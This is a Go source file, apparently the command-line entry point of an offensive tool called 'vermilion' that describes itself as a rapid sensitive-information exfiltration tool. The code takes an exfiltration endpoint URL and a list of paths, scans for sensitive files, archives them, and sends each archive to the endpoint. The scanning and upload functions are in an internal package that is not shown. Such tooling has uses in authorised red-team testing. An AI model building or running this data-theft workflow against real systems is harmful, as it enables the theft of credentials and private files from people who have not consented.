package cmd

import (
	"fmt"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/r3drun3/vermilion/internal"
	"github.com/spf13/cobra"
)

var (
	endpoint   string
	noExf      bool
	pathsInput string
)

func init() {
	rootCmd.PersistentFlags().StringVarP(&endpoint, "endpoint", "e", "", "Exfiltration endpoint URL")
	rootCmd.PersistentFlags().BoolVarP(&noExf, "noexf", "n", false, "Skip exfiltration and save locally")
	rootCmd.PersistentFlags().StringVarP(&pathsInput, "paths", "p", "", "Comma-separated list of paths to gather sensitive data from")
}

// Helper function to expand `~` in paths
func expandPath(path string) string {
	if len(path) > 1 && path[:2] == "~/" {
		usr, err := os.UserHomeDir()
		if err != nil {
			color.Red("Error retrieving current user: %v", err)
			return path // Return original if expansion fails
		}
		return strings.Replace(path, "~", usr, 1)
	}
	return path
}

var rootCmd = &cobra.Command{
	Use:   "vermilion",
	Short: "Vermilion - Rapid sensitive info exfiltration tool",
	Run: func(cmd *cobra.Command, args []string) {
		outputDir := "exdata"

		// Define color styles
		info := color.New(color.FgCyan, color.Bold).SprintFunc()
		success := color.New(color.FgGreen, color.Bold).SprintFunc()
		warning := color.New(color.FgYellow).SprintFunc()
		errorMsg := color.New(color.FgRed, color.Bold).SprintFunc()

		// Parse paths if provided and expand `~`
		var paths []string
		if pathsInput != "" {
			rawPaths := strings.Split(pathsInput, ",")
			for _, p := range rawPaths {
				paths = append(paths, expandPath(p))
			}
		}

		// Scan for sensitive files
		color.Cyan("Scanning for sensitive files...")
		files, err := internal.ScanSensitiveFiles(outputDir, paths)
		if err != nil {
			fmt.Println(errorMsg("Error scanning sensitive files:"), err)
			return
		}
		fmt.Printf("%s Found %d sensitive files.\n", success("✓"), len(files))

		// Archive files
		color.Cyan("Creating archive...")
		archives, err := internal.CreateArchive(outputDir, files)
		if err != nil {
			fmt.Println(errorMsg("Error creating archives:"), err)
			return
		}
		fmt.Printf("%s Created %d archives.\n", success("✓"), len(archives))

		// Exfiltrate each archive if required
		if !noExf {
			color.Cyan("Starting exfiltration...")
			for _, archivePath := range archives {
				fmt.Printf("%s Exfiltrating archive: %s\n", info("➜"), archivePath)
				err = internal.Exfiltrate(endpoint, archivePath)
				if err != nil {
					fmt.Printf("%s Error during exfiltration of %s: %v\n", warning("!"), archivePath, err)
					continue
				}
			}
			fmt.Println(success("✓ Exfiltration completed."))
		} else {
			fmt.Println(warning("Exfiltration skipped."))
		}
	},
}

// Execute is the entry point for the CLI
func Execute() {
	if err := rootCmd.Execute(); err != nil {
		color.Red(err.Error())
		os.Exit(1)
	}
}
